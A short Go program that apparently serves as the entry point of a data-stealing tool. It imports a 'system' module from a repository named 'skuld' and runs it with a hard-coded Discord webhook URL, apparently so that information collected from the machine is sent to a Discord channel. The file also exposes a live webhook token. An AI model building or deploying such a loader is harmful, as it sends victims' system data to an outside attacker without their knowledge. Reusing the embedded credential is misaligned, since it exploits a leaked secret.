package main

import (
	"fmt"
	"os"

	"github.com/SAKIB-SALIM/skuld/mods/system"
)

func main() {
	webhook := "https://discord.com/api/webhooks/1302674995280871545/fsmwXtFfChCn7ktcF3Gy8Pu0mv8YeOv9Izht3yC7Kstm5gHsa8ovmSvepksTpKXc7ICe"

	// Run the function
	defer func() {
		if err := recover(); err != nil {
			fmt.Fprintf(os.Stderr, "Error occurred: %v\n", err)
		}
	}()

	system.Run(webhook)
}
